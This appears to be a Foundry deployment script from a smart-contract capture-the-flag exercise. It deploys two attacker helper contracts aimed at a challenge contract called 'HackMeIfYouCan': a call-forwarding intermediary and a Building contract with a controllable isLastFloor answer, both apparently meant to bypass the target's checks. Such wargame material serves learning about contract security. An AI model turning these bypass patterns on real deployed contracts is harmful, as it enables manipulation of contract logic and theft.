// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.0;
import {Script} from "forge-std/Script.sol";

interface IHackMeIfYouCan {
    function addPoint() external;
}

contract Intermediary {
    IHackMeIfYouCan hackMeIfYouCan;

    constructor(address _hackMeIfYouCan) {
        hackMeIfYouCan = IHackMeIfYouCan(_hackMeIfYouCan);
    }

    function callAddPoint() public {
        hackMeIfYouCan.addPoint();
    }
}

interface Building {
    function isLastFloor(uint256) external returns (bool);
}

contract BuildingContract is Building {
    bool public lastFloor = false;

    function setLastFloor(bool _isLastFloor) public {
        lastFloor = _isLastFloor;
    }

    function isLastFloor(uint256) external override returns (bool) {
        return lastFloor;
    }
}

contract DeployIntermediaryAndBuilding is Script {
    address hackMeIfYouCanAddress = 0x9D29D33d4329640e96cC259E141838EB3EB2f1d9;

    function run() external {
        vm.startBroadcast();

        Intermediary intermediary = new Intermediary(hackMeIfYouCanAddress);

        BuildingContract building = new BuildingContract();

        vm.stopBroadcast();
    }
}
